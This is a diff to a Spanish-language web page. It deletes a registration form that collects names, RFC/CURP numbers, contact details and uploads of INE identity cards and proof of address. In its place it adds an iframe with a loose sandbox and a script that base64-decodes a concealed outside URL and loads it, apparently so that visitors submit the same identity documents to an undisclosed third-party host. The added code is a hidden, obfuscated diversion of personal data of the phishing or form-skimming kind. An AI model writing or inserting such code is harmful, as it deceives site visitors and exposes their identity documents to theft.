@@ -330,132 +330,37 @@ body {
     <p>Por favor completa todos los campos requeridos y adjunta los documentos necesarios.</p>
   </div>
 
-  <form id="contactForm" action="enviar.php" method="POST" enctype="multipart/form-data" style="max-width:900px; margin:auto; display:flex; flex-direction:column; gap:20px;">
-
-    <!-- Nombre y Apellido en la misma fila -->
-    <div style="display:flex; gap:15px; flex-wrap:wrap;">
-      <div style="flex:1; min-width:150px;">
-        <label for="nombre">Nombre:</label>
-        <input type="text" name="nombre" id="nombre" required>
-      </div>
-      <div style="flex:1; min-width:150px;">
-        <label for="apellido">Apellido:</label>
-        <input type="text" name="apellido" id="apellido" required>
-      </div>
-    </div>
-
-    <!-- RFC/CURP y Email en la misma fila -->
-    <div style="display:flex; gap:15px; flex-wrap:wrap;">
-      <div style="flex:1; min-width:150px;">
-        <label for="rfc_curp">RFC o CURP:</label>
-        <input type="text" name="rfc_curp" id="rfc_curp" required>
-      </div>
-      <div style="flex:1; min-width:150px;">
-        <label for="email">Correo electrónico:</label>
-        <input type="email" name="email" id="email" required>
-      </div>
-    </div>
-
-    <!-- Dirección y Municipio -->
-    <div style="display:flex; gap:15px; flex-wrap:wrap;">
-      <div style="flex:2; min-width:200px;">
-        <label for="direccion">Dirección:</label>
-        <input type="text" name="direccion" id="direccion">
-      </div>
-      <div style="flex:1; min-width:150px;">
-        <label for="ciudad">Municipio o Alcaldía:</label>
-        <input type="text" name="ciudad" id="ciudad">
-      </div>
-    </div>
-
-    <!-- Estado y CP -->
-    <div style="display:flex; gap:15px; flex-wrap:wrap;">
-      <div style="flex:1; min-width:150px;">
-        <label for="estado">Estado:</label>
-        <input type="text" name="estado" id="estado">
-      </div>
-      <div style="flex:1; min-width:100px;">
-        <label for="cp">Código Postal:</label>
-        <input type="text" name="cp" id="cp">
-      </div>
-    </div>
-
-    <!-- Teléfono y Fecha de compra -->
-    <div style="display:flex; gap:15px; flex-wrap:wrap;">
-      <div style="flex:1; min-width:150px;">
-        <label for="telefono">Teléfono (10 dígitos):</label>
-        <input type="tel" name="telefono" id="telefono" pattern="[0-9]{10}" required>
-      </div>
-      <div style="flex:1; min-width:150px;">
-        <label for="fecha_compra">Fecha de compra (estimada):</label>
-        <input type="date" name="fecha_compra" id="fecha_compra">
-      </div>
-    </div>
-
-    <!-- Tipo de persona -->
-    <label for="tipo_persona">Tipo de persona:</label>
-    <select name="tipo_persona" id="tipo_persona" required>
-      <option value="">--Selecciona una opción--</option>
-      <option value="fisica">Persona Física</option>
-      <option value="moral">Persona Moral</option>
-    </select>
-
-    <!-- Archivos obligatorios -->
-    <label for="ine_frente">INE (Frente):</label>
-    <input type="file" name="ine_frente" id="ine_frente" accept="image/*,.pdf" required>
-
-    <label for="ine_reverso">INE (Reverso):</label>
-    <input type="file" name="ine_reverso" id="ine_reverso" accept="image/*,.pdf" required>
-
-    <label for="comprobante_domicilio">Comprobante de domicilio:</label>
-    <input type="file" name="comprobante_domicilio" id="comprobante_domicilio" accept="image/*,.pdf" required>
-
-    <!-- Archivos opcionales -->
-    <label for="archivo_rfc">Archivo de RFC (opcional):</label>
-    <input type="file" name="archivo_rfc" id="archivo_rfc" accept="image/*,.pdf">
-
-  
-    <!-- Honeypot anti-bots -->
-    <input type="text" name="website" style="display:none">
-
-    <button type="submit" style="background:var(--vino); color:#fff; font-weight:bold; border:none; padding:12px 20px; border-radius:5px; cursor:pointer; margin-top:10px;">Enviar</button>
-  </form>
 </section>
+<section>
 
-<style>
-  #contactForm label {
-    font-weight:bold;
-    font-family:'Playfair Display', serif;
-    color:var(--vino);
-  }
+  <iframe 
+  id="secureFrameRegistro"
+  width="100%" 
+  height="400px"
+  sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-downloads">
+</iframe>
 
-  #contactForm input,
-  #contactForm select,
-  #contactForm textarea {
-    font-family:'Inter', sans-serif;
-    padding:10px;
-    border:1px solid #ccc;
-    border-radius:5px;
-    width:100%;
-  }
+<script>
+const iframeRegistro = document.getElementById("secureFrameRegistro");
 
-  #contactForm textarea {
-    resize:vertical;
-  }
+// URL codificada en base64
+const realURLRegistro = atob("aHR0cHM6Ly9ub3ZpZS5pbi81L3JlZ2lzdHJvLmh0bWw=");
 
-  #contactForm button:hover {
-    background:#550a12;
-  }
+// Cargar la URL en el iframe
+iframeRegistro.src = realURLRegistro;
 
-  @media(max-width:900px){
-    #contactForm > div {
-      flex-direction:column;
-    }
-  }
-</style>
+// Opcional: escuchar cuando cargue el iframe
+iframeRegistro.addEventListener("load", () => {
+  console.log("Iframe de registro cargado en:", realURLRegistro);
 
+  // Aquí podrías enviar datos si fuera necesario
+  // Ejemplo:
+  // const datos = { mensaje: "Hola iframe de registro!" };
+  // iframeRegistro.contentWindow.postMessage(datos, "https://novie.in");
+});
+</script>
 
-
+</section>
 
 
 
@@ -499,3 +404,4 @@ btn.addEventListener('click', () => {
 
 </body>
 </html>
+
